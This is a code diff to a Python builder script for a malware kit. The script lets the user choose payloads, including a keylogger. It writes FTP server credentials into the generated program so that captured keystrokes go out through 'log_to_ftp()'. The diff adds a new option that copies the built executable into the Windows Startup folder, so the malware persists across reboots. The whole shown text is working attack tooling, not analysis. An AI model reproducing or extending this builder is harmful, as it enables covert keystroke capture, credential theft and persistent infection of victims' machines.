@@ -16,7 +16,7 @@ print(ASCII_DATA)
 print("Select yor payloads (seprated by spaces) :")
 print("1.Satelite")
 print("2.KeyLogger")
-
+print("3.Bind binary to startup")
 DEBUG = True
 
 
@@ -30,8 +30,7 @@ address = input("input ftp address : ")
 username = input("input ftp username : ")
 password = input("input ftp password : ")
 File.write('from  network.ftpconn import init_creditinals\n')
-File.write("init_creditinals(" + "\"" + address + "\",\"" + username + "\",\"" + password + "\")\n" )
-
+File.write('init_creditinals("' +  address + '","' + username + '","' + password + '")\n' )
 iconfile = input("icon file for the binary (if not needed leave it) : ")
 
 for i in list_keys:
@@ -44,7 +43,9 @@ for i in list_keys:
         File.write('from  payloads.keylogger import log_to_ftp\n')
         File.write('log_to_ftp()\n')
         File.write('\n')
-
+    elif i == 3 :
+        File.write("import os \n")
+        File.write("os.system('copy " + Name + '.exe' + ' "C:\\\\users\\\\%username%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup"\')\n')    
 
    
 File.close()
